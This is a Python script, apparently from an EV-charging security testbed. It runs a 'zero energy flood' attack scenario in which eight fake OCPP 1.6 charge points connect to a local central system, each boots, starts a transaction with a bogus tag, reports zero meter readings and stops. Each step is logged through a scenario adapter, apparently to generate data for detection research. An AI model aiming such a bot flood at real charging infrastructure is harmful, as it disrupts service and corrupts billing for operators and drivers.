import asyncio
import logging
import websockets
from ocpp.v16.enums import ChargePointStatus
from src.core.scenario_adapter import ScenarioAdapter
from .charge_point import SimulatedChargePoint

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

import random

async def bot_attack(bot_index, adapter):
    bot_id = f"CP_BOT_{random.randint(10000, 99999)}"
    uri = f"ws://127.0.0.1:9000/{bot_id}"
    
    logger.info(f"🤖 [BOTNET] Bot {bot_index+1} başlatılıyor ({bot_id})...")
    
    try:
        async with websockets.connect(uri, subprotocols=["ocpp1.6"]) as ws:
            cp = SimulatedChargePoint(bot_id, ws)
            cp_task = asyncio.create_task(cp.start())
            
            await cp.send_boot_notification()
            adapter.emit("BootNotification", {"model": "FloodBot", "vendor": "DarkNet"}, override_cp_id=bot_id)
            
            # Hızlı Saldırı: Start -> Meter(0) -> Stop
            id_tag = f"BAD_TAG_{bot_index}"
            await cp.start_charging(id_tag=id_tag, meter_start=0)
            adapter.emit("StartTransaction", {"idTag": id_tag, "transactionId": cp.transaction_id}, override_cp_id=bot_id)
            
            # Zero Energy
            await cp.simulate_meter_values(force_value=0)
            adapter.emit("MeterValues", {"transactionId": cp.transaction_id, "meterValue": "0"}, override_cp_id=bot_id)
            
            await cp.stop_charging(reason="EVDisconnected")
            adapter.emit("StopTransaction", {"transactionId": cp.transaction_id, "reason": "Local"}, override_cp_id=bot_id)
            
            cp_task.cancel()
            
    except Exception as e:
        logger.error(f"❌ Bot {bot_id} hatası: {e}")

async def run_attack_with_adapter(adapter):
    logger.info("🌊 [OMER] ZERO ENERGY FLOOD (BOTNET MODE) BAŞLATILIYOR")
    
    tasks = []
    # 5-10 Bot aynı anda saldırıyor
    for i in range(8): 
        tasks.append(bot_attack(i, adapter))
        await asyncio.sleep(0.2) # Hafif kademeli başlatma
        
    await asyncio.gather(*tasks)
    
    logger.info("🚨 [OMER] BOTNET SALDIRISI TAMAMLANDI")

def run_scenario(mode: str = "attack", adapter: ScenarioAdapter = None):
    if mode == "attack":
        asyncio.run(run_attack_with_adapter(adapter))
    else:
        logger.info("Normal mod bu senaryo için tasarlanmadı.")

if __name__ == "__main__":
    from src.core.scenario_adapter import ScenarioAdapter
    adapter = ScenarioAdapter("CP_OMER_FLOOD", "omer_zero_energy_flood")
    run_scenario("attack", adapter)